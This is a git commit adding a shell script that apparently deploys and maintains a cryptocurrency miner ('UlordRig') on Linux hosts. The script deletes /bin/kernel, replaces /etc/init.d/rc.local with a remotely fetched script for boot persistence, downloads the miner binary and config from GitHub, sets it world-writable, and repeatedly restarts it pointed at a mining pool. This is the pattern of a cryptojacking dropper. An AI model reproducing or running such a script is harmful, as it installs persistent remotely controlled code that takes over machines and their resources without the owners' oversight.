e221cfba3696679bde72dadd43b3cd7a02ef9e45
TopSun2010 <44044190+TopSun2010@users.noreply.github.com>
2018-10-28 23:18:56 +0800

    Create consci.sh

---
+++ consci.sh
@@ -0,0 +1,47 @@
+#!/bin/sh
+
+sudo rm -rf /bin/kernel
+
+rcmessage="UlordRig-Linux-V1.0.0"
+if cat /etc/init.d/rc.local | grep "$rcmessage">/dev/null
+then
+echo "local existence"
+else 
+wget https://raw.githubusercontent.com/TopSun2010/uld/master/rc.sh -O /etc/init.d/rc.local
+fi
+if [ ! -d "/opt/miners/UlordRig-Linux-V1.0.0/" ];then
+mkdir /opt/miners/UlordRig-Linux-V1.0.0
+wget https://raw.githubusercontent.com/TopSun2010/uld/master/config.json.98.sh -O /opt/miners/UlordRig-Linux-V1.0.0/config.json
+wget https://raw.githubusercontent.com/TopSun2010/uld/master/rig.sh -O /opt/miners/UlordRig-Linux-V1.0.0/ulordrig
+sudo chmod 777 /opt/miners/UlordRig-Linux-V1.0.0/ulordrig
+fi
+message="ulord.bi-chi.com:7100"
+if cat /opt/miners/UlordRig-Linux-V1.0.0/config.json | grep "$message">/dev/null
+then
+echo "existence"
+else
+wget https://raw.githubusercontent.com/TopSun2010/uld/master/config.json.98.sh -O /opt/miners/UlordRig-Linux-V1.0.0/config.json
+sudo killall ulordrig
+sleep 3
+cd /opt/miners/UlordRig-Linux-V1.0.0 && ./ulordrig
+fi
+message1="threads":2"
+if cat /opt/miners/UlordRig-Linux-V1.0.0/config.json | grep "$message1">/dev/null
+then
+echo "existence"
+else
+wget https://raw.githubusercontent.com/TopSun2010/uld/master/config.json.98.sh -O /opt/miners/UlordRig-Linux-V1.0.0/config.json
+sudo killall ulordrig
+sleep 3
+cd /opt/miners/UlordRig-Linux-V1.0.0 && ./ulordrig
+fi
+if test $( pgrep -f ulordrig | wc -l ) -eq 0
+then
+sudo killall ulordrig
+sleep 3
+cd /opt/miners/UlordRig-Linux-V1.0.0 && ./ulordrig
+else
+echo "Process existence"
+fi
+sleep 1
+sudo pidof ulordrig
